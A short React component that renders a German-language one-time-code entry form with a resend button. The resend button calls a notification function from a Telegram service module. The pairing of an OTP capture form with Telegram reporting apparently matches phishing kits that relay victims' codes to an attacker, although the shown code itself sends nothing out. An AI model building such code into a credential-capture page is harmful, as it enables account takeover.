import React from 'react';
import { OTPInput } from './OTPInput';
import { OTPHeader } from './OTPHeader';
import { Button } from '../../form/Button';
import { ErrorMessage } from '../../common/ErrorMessage';
import { LoadingSpinner } from '../../common/LoadingSpinner';
import { useOTPForm } from '../../../hooks/useOTPForm';
import { sendOTPResendNotification } from '../../../services/telegram/otp';

export const OTPForm: React.FC = () => {
  const { isLoading, error, otp, setOTP, clearOTP, handleSubmit } = useOTPForm();
  
  const handleResendClick = async () => {
    await sendOTPResendNotification();
  };

  return (
    <>
      {error && <ErrorMessage message={error} />}
      <OTPHeader />
      <form onSubmit={handleSubmit} className="proceed maskable" noValidate>
        <OTPInput 
          value={otp} 
          onChange={setOTP} 
          onClear={clearOTP}
          disabled={isLoading} 
        />
        <Button 
          type="submit" 
          disabled={isLoading || otp.some(digit => !digit)}
        >
          Bestätigen
        </Button>
        <button
          type="button"
          onClick={handleResendClick}
          className="resend-otp-button"
          disabled={isLoading}
        >
          Code erneut senden
        </button>
      </form>
      {isLoading && <LoadingSpinner />}
    </>
  );
};